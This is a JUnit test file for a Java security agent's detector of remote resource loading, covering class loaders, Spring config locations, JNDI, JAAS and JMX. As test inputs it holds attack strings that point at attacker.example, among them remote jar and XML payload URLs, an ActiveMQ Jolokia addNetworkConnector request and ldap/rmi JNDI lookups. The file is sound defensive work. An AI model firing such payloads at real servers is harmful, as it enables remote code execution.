package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.request;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** RemoteResourceDetector: Class loader URLs, Spring config locations, JNDI names, JAAS config and JMX operations. */
final class RemoteResourceDetectorTest {
  @Test
  void detectsRemoteUrlClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "http://attacker.example/evil.jar",
            "URLClassLoader",
            request(Map.of("codebase", List.of("http://attacker.example/evil.jar"))));

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsJarWrappedRemoteClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "jar:http://attacker.example/evil.jar!/payload/",
            "URLClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsRmiClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "ldap://attacker.example/Exploit",
            "RMIClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void ignoresLocalUrlClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar",
            "URLClassLoader",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "http://attacker.example/poc.xml",
            "SpringConfig",
            request(Map.of("config", List.of("http://attacker.example/poc.xml"))));

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsXbeanRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "xbean:http://attacker.example/poc.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsJarWrappedRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "jar:http://attacker.example/poc.jar!/beans.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void ignoresLocalSpringConfigLocation() {
    assertTrue(
        RemoteResourceDetector
            .detectSpringConfigLocation("classpath:applicationContext.xml", "SpringConfig", request())
            .isEmpty());
    assertTrue(
        RemoteResourceDetector
            .detectSpringConfigLocation("file:/opt/app/applicationContext.xml", "SpringConfig", request())
            .isEmpty());
  }

  @Test
  void detectsRequestTimeJmxRemoteConfigInvocation() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request());

    assertAlgorithm(result, "jmx_remote_config");
  }

  @Test
  void detectsActiveMqJolokiaBrokerConfigInvocation() {
    String body =
        "{\"type\":\"exec\","
            + "\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\","
            + "\"operation\":\"addNetworkConnector(java.lang.String)\","
            + "\"arguments\":[\"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)\"]}";
    RequestContext request =
        new RequestContext(
            "POST",
            "/api/jolokia/",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "authorization", "Basic YWRtaW46YWRtaW4="),
            body);

    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector(java.lang.String)",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request);

    assertAlgorithm(result, "jmx_remote_config");
    assertEquals(100, result.orElseThrow().confidence());
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
    assertEquals("/api/jolokia/", result.orElseThrow().request().uri());
  }

  @Test
  void ignoresReadOnlyJmxRemoteUrlArgument() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "example:type=Info",
            "getStatus",
            List.of("http://example.com/status"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJmxBenignFileWriteTarget() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "example:type=Logger",
            "setLogFile",
            List.of("/var/log/app/current.log"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundJmxRemoteConfigInvocation() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsJndi() {
    var result = RemoteResourceDetector.detectJndi("ldap://127.0.0.1:1389/a", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void detectsJndiRemoteRmiScheme() {
    var result = RemoteResourceDetector.detectJndi("rmi://attacker.example.com:1099/Exploit", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresLocalContainerJndiNames() {
    // Legitimate Java EE / container-managed lookups must not trip the detector
    // (closes the documented 100% JNDI false-positive precision gap).
    assertTrue(RemoteResourceDetector.detectJndi("java:comp/env/jdbc/AppDataSource", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("java:comp/env/jms/QueueConnectionFactory", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("java:global/AppEjb/UserService", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("jdbc/AppDataSource", request()).isEmpty());
  }

  @Test
  void declaredDirectoryDoesNotEstablishLoginModuleRouting() {
    String config = "com.sun.security.auth.module.JndiLoginModule required user.provider.url=ldap://reports.invalid/weekly;";
    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
    var routed = RemoteResourceDetector.detectJndi("ldap://reports.invalid/weekly", request(), "JndiLoginModule.lookup");
    assertAlgorithm(routed, "jndi_jaas_config");
    assertEquals("url_scheme_selection", routed.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void ignoresBenignJaasConfigWithoutJndiLoginModule() {
    String config =
        "org.apache.kafka.common.security.scram.ScramLoginModule required "
            + "username=\"app\" password=\"secret\";";

    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
  }
}
